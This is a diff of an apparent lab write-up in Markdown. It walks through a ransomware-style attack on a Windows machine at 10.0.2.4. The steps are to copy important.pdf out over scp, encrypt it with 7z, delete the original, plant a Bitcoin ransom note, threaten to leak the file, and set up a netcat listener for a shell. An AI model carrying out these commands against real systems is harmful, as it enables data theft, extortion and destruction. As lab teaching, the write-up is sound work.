@@ -50,7 +50,7 @@ _Fig. 3_
 
 <div align="justify">
 
-Once we have a SSH session, where we impersonate an account with high privileges, we can again search for some interesting files. Use the command `cmd` and then move to the Desktop directory with `cd`. Let’s try to search for some PDF documents with the command `dir *.pdf`. We can see (_Fig. 3_) that there is a file called _important.pdf_, that contains useful information for the Administrator. Let’s retrieve a copy of this document to the Kali machine. To do this, we need to exit the SSH session (command `exit`) and then use the command `scp Administrator@10.0.2.4:C:/Users/Administrator/Desktop/important.pdf /home/kali/`. We insert again the obtained password and the file will now be copied to the Kali machine. We can then diffuse the content of this file if the ransom will not be paid by a reasonable deadline.
+Once we have a SSH session, where we impersonate an account with high privileges, we can again search for some interesting files. Use the command `cmd` and then move to the Desktop directory with `cd`. Let’s try to search for some PDF documents with the command `dir *.pdf`. We can see (_Fig. 3_) that there is a file called _important.pdf_, that probably contains crucial information for the _Administrator_. Let’s retrieve a copy of this document from the target and send it to the Kali machine. To do this, we need to exit the SSH session (command `exit`) and then use the command `scp Administrator@10.0.2.4:C:/Users/Administrator/Desktop/important.pdf /home/kali/`. We insert again the _Administrator_'s password and the file will now be copied to the Kali machine. We can then diffuse the content of this file if the ransom will not be paid by a reasonable deadline.
 
 </div>
 
@@ -58,7 +58,7 @@ Once we have a SSH session, where we impersonate an account with high privileges
 
 <div align="justify">
 
-We establish again a SSH session as before impersonating the user Administrator. Then use the command `cmd` and move to the Desktop directory with `cd` (_Fig. 4_). Now let’s encrypt the file _important.pdf_ on the target by using the following command: `7z a -pAtckPwd encrypted.7z important.pdf`. Instead of _AtckPwd_ we should use a password that is at least 10 characters long and not in any dictionary (ex. _k7h9Y?àX5$sP_). This will prevent the defender from easily guessing our selected password. The target will now contain an encrypted file called _encrypted.7z_ (_Fig. 4_), that can be decrypted only using the correct password. The chosen password and the instructions to decrypt the file will be sent by the attacker to the target after the ransom is paid. Finally, it’s important to delete the original file on the target by using the command `del`.
+We establish again a SSH session as before impersonating the user _Administrator_. Then use the command `cmd` and move to the Desktop directory with `cd` (_Fig. 4_). Now let’s encrypt the file _important.pdf_ on the target by using the following command: `7z a -pAtckPwd encrypted.7z important.pdf`. Instead of _AtckPwd_ we should use a password that is at least 10 characters long and not in any dictionary (ex. _k7h9Y?àX5$sP_). This will prevent the defender from easily guessing our selected password. The target will now contain an encrypted file called _encrypted.7z_ (_Fig. 4_), that can be decrypted only using the correct password. The chosen password and the instructions to decrypt the file will be sent by the attacker to the target after the ransom is paid. Finally, it’s important to delete the original file on the target by using the command `del`.
 Now just construct a text file containing the address of the Bitcoin wallet, where the money of the ransom can be sent to. We put this file on the Desktop of the target machine with the command `scp /home/kali/BitcoinAddress.txt Administrator@10.0.2.4:C:/Users/Administrator/Desktop/`.
 
 </div>
@@ -109,7 +109,7 @@ Now, we use the command `nc -nlvp 443` to set up `nc` to listen for incoming con
 ![Fig. 8](images/fig8.png)
 _Fig. 8_
 
-> **Interesting observation**: We executed all the attack steps without the need for the Administrator (account) to physically log on the target.
+> **Interesting observation**: We executed all the attack steps without the need for the _Administrator_ to physically log on to the target.
 
 ## Conclusion
 
